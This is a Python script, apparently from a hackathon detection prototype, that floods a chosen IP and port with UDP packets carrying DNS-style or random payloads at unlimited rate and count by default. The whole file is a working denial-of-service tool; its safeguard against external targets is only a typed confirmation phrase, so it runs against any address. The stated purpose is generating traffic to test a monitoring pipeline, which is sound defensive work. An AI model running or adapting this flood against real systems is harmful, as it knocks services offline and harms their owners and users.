#!/usr/bin/env python3
"""
EKADHARA Attack Script — UDP Flood / Amplification
PS-26145 | SIH 2026 Hackathon Prototype

Sends UDP packets to the target with large payloads, simulating
DNS amplification and other UDP-based reflection attacks.
Generates real network traffic detectable by the EKADHARA monitoring pipeline.

Usage:
    python udp_flood.py --target <ip> [--port <port>] [--count <num>] [--size <bytes>] [--verbose]
"""

import argparse
import ipaddress
import math
import os
import random
import socket
import struct
import sys
import threading
import time
from datetime import datetime

# ============================================================
# ANSI Color Codes (Windows Terminal compatible)
# ============================================================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# ============================================================
# Constants
# ============================================================
BANNER = f"""{BOLD}{MAGENTA}
╔══════════════════════════════════════════════════╗
║   EKADHARA Attack Traffic Generator             ║
║   UDP Flood / Amplification — PS-26145          ║
╚══════════════════════════════════════════════════╝{RESET}"""

LEGAL_WARNING = (
    f"\n{RED}{BOLD}[!] LEGAL WARNING:{RESET}\n"
    f"    This tool generates REAL network packets.\n"
    f"    Only use against localhost (127.0.0.1) or IPs you OWN.\n"
    f"    Unauthorized scanning/flooding is ILLEGAL.\n"
)

# ============================================================
# Global stats (shared between threads)
# ============================================================
stats = {'packets': 0, 'bytes': 0, 'rate': 0.0, 'duration': 0.0}


# ============================================================
# Safety Checks
# ============================================================
def is_safe_target(ip_str):
    """Check if target is localhost or a private IP address."""
    try:
        ip = ipaddress.ip_address(ip_str)
        return ip.is_loopback or ip.is_private
    except ValueError:
        return False


def warn_external_target(ip_str):
    """Print warning if targeting an external IP."""
    if not is_safe_target(ip_str):
        print(f"\n{RED}{BOLD}[!!!] EXTERNAL TARGET DETECTED: {ip_str}{RESET}")
        print(f"    {YELLOW}This tool is intended for localhost or private networks only.{RESET}")
        print(f"    {YELLOW}Ensure you have EXPLICIT WRITTEN PERMISSION from the target owner.{RESET}")
        confirm = input(f"\n    {BOLD}Type 'I HAVE PERMISSION' to proceed: {RESET}")
        if confirm.strip() != "I HAVE PERMISSION":
            print(f"{RED}Aborted.{RESET}")
            sys.exit(0)
        print(f"{YELLOW}Proceeding with external target...{RESET}\n")


# ============================================================
# DNS Amplification Payload Generator
# ============================================================
def generate_dns_amplification_payload(size, domain="example.com"):
    """
    Generate a DNS query payload that could be used for amplification.
    This is a simplified DNS-like payload structure for traffic generation.
    """
    # DNS header: 12 bytes
    # Transaction ID, Flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
    txid = random.randint(0, 65535)
    flags = 0x0100  # Standard query, recursion desired
    qdcount = 1
    ancount = 0
    nscount = 0
    arcount = 0

    dns_header = struct.pack(
        "!HHHHHH",
        txid, flags, qdcount, ancount, nscount, arcount
    )

    # Build a random subdomain for entropy
    subdomain_len = min(size - 50, random.randint(20, 60))
    subdomain = ''.join(
        random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
        for _ in range(subdomain_len)
    )
    query_name = f"{subdomain}.{domain}"

    # Encode domain name (length-prefixed labels)
    encoded_name = b''
    for part in query_name.split('.'):
        encoded_name += struct.pack('!B', len(part)) + part.encode()
    encoded_name += b'\x00'  # Null terminator

    # Query type: TXT (0x0010), A (0x0001), NULL (0x000C)
    query_types = [0x0010, 0x0001, 0x000C, 0x00FF]  # TXT, A, NULL, ANY
    qtype = random.choice(query_types)
    qclass = 0x0001  # IN class

    dns_question = encoded_name + struct.pack("!HH", qtype, qclass)

    payload = dns_header + dns_question

    # Pad to requested size with random data
    remaining = size - len(payload)
    if remaining > 0:
        payload += bytes(random.randint(0, 255) for _ in range(remaining))

    return payload[:size]


def generate_random_payload(size):
    """Generate a random payload of the specified size."""
    return bytes(random.randint(0, 255) for _ in range(size))


# ============================================================
# Attack Functions
# ============================================================
def udp_flood(target_ip, target_port, count, size, rate, stop_event, verbose):
    """Send UDP flood packets with large payloads."""
    packets_sent = 0
    bytes_sent = 0
    start_time = time.time()

    # DNS domains for varied payloads
    domains = [
        "example.com", "test.com", "local.net", "demo.org",
        "sample.io", "proto.dev", "api.local", "svc.internal"
    ]

    # Create socket (non-blocking for rate control)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.0)

    last_stats_time = start_time
    packets_since_last = 0

    while not stop_event.is_set():
        if count > 0 and packets_sent >= count:
            break

        # Alternate between DNS-like and random payloads
        if random.random() < 0.6:
            payload = generate_dns_amplification_payload(
                size,
                random.choice(domains)
            )
        else:
            payload = generate_random_payload(size)

        src_port = random.randint(1024, 65535)

        try:
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            bytes_sent += len(payload)
            packets_since_last += 1

            stats['packets'] = packets_sent
            stats['bytes'] = bytes_sent
            elapsed = time.time() - start_time
            stats['duration'] = elapsed
            if elapsed > 0:
                stats['rate'] = packets_sent / elapsed

            if verbose and packets_sent % 100 == 0:
                bw = (bytes_sent * 8) / elapsed / 1000 if elapsed > 0 else 0
                print(f"  {DIM}Sent {packets_sent} pkts ({bw:.1f} kbps){RESET}")

            # Rate limiting
            if rate > 0:
                time.sleep(1.0 / rate)

        except Exception as e:
            if verbose:
                print(f"  {RED}Error: {e}{RESET}")

        # Stats update every second for display
        now = time.time()
        if now - last_stats_time >= 1.0:
            last_stats_time = now
            packets_since_last = 0

    sock.close()


# ============================================================
# Stats Display
# ============================================================
def display_stats(stop_event, target_ip, target_port, size):
    """Periodic stats display thread."""
    last_packets = 0
    last_bytes = 0

    while not stop_event.is_set():
        time.sleep(1.0)
        pkt = stats['packets']
        total_bytes = stats['bytes']
        elapsed = stats['duration']

        instant_rate = pkt - last_packets
        instant_bw = ((total_bytes - last_bytes) * 8) / 1000  # kbps
        avg_rate = stats['rate']

        last_packets = pkt
        last_bytes = total_bytes

        tgt_str = f"{BOLD}{GREEN}{target_ip}:{target_port}{RESET}"
        pkt_str = f"{BOLD}{WHITE}{pkt}{RESET}"
        rate_str = f"{BOLD}{CYAN}{avg_rate:.1f}{RESET}"
        bw_str = f"{BOLD}{YELLOW}{instant_bw:.1f}{RESET}"

        print(
            f"\r{BOLD}[UDP FLOOD]{RESET} Target: {tgt_str} | "
            f"Packets: {pkt_str} | Rate: {rate_str} pps | "
            f"BW: {bw_str} kbps | Size: {size}B   ",
            end="",
            flush=True
        )


# ============================================================
# Main Entry Point
# ============================================================
def run_attack(**kwargs):
    """
    Main entry point for the UDP flood attack.

    Accepts kwargs dict with keys:
        target (str): Target IP address
        port (int): Target port (default 53)
        count (int): Number of packets (0 = unlimited)
        size (int): Packet size in bytes (default 512)
        rate (int): Packets per second (0 = unlimited)
        verbose (bool): Enable verbose output
    """
    target = kwargs.get('target', '127.0.0.1')
    port = kwargs.get('port', 53)
    count = kwargs.get('count', 0)
    size = kwargs.get('size', 512)
    rate = kwargs.get('rate', 0)
    verbose = kwargs.get('verbose', False)

    print(BANNER)
    print(LEGAL_WARNING)

    warn_external_target(target)

    print(f"\n{BOLD}[*] Target:{RESET}    {target}:{port}")
    print(f"{BOLD}[*] Count:{RESET}     {'Unlimited' if count == 0 else count}")
    print(f"{BOLD}[*] Size:{RESET}      {size} bytes/packet")
    print(f"{BOLD}[*] Rate:{RESET}      {'Unlimited' if rate == 0 else f'{rate} pps'}")
    print(f"{BOLD}[*] Start:{RESET}     {datetime.now().strftime('%H:%M:%S')}")
    print(f"\n{BOLD}{RED}Press Ctrl+C to stop.{RESET}\n")

    stop_event = threading.Event()
    start_time = time.time()

    # Stats display thread
    stats_thread = threading.Thread(
        target=display_stats,
        args=(stop_event, target, port, size),
        daemon=True
    )
    stats_thread.start()

    # Attack thread
    attack_thread = threading.Thread(
        target=udp_flood,
        args=(target, port, count, size, rate, stop_event, verbose),
        daemon=True
    )
    attack_thread.start()

    try:
        while attack_thread.is_alive():
            attack_thread.join(timeout=1)
    except KeyboardInterrupt:
        print(f"\n\n{BOLD}{YELLOW}[*] Stopping UDP flood...{RESET}")
        stop_event.set()
        attack_thread.join(timeout=2)

    # Final summary
    elapsed = time.time() - start_time
    total_bytes = stats['bytes']
    bandwidth_kbps = (total_bytes * 8) / elapsed / 1000 if elapsed > 0 else 0
    bandwidth_mbps = bandwidth_kbps / 1000

    print(f"\n\n{BOLD}{GREEN}{'='*50}{RESET}")
    print(f"{BOLD}{GREEN}  UDP FLOOD SUMMARY{RESET}")
    print(f"{BOLD}{GREEN}{'='*50}{RESET}")
    print(f"  Target:          {target}:{port}")
    print(f"  Packets sent:    {stats['packets']}")
    print(f"  Data sent:       {total_bytes / 1024 / 1024:.2f} MB")
    print(f"  Avg bandwidth:   {bandwidth_kbps:.1f} kbps ({bandwidth_mbps:.2f} Mbps)")
    print(f"  Avg rate:        {stats['rate']:.1f} pps" if elapsed > 0 else "  Avg rate:        N/A")
    print(f"  Duration:        {elapsed:.1f}s")
    print(f"{BOLD}{GREEN}{'='*50}{RESET}")


# ============================================================
# CLI
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="EKADHARA UDP Flood / Amplification Generator — PS-26145",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python udp_flood.py --target 127.0.0.1 --port 53
  python udp_flood.py --target 127.0.0.1 --port 53 --count 5000 --size 4096
  python udp_flood.py --target 127.0.0.1 --port 53 --rate 100 --verbose
        """
    )
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=53, help='Target port (default: 53)')
    parser.add_argument('--count', type=int, default=0, help='Number of packets (0=unlimited)')
    parser.add_argument('--size', type=int, default=512, help='Payload size in bytes (default: 512)')
    parser.add_argument('--rate', type=int, default=0, help='Packets per second (0=unlimited)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')

    args = parser.parse_args()
    run_attack(
        target=args.target,
        port=args.port,
        count=args.count,
        size=args.size,
        rate=args.rate,
        verbose=args.verbose
    )


if __name__ == '__main__':
    main()
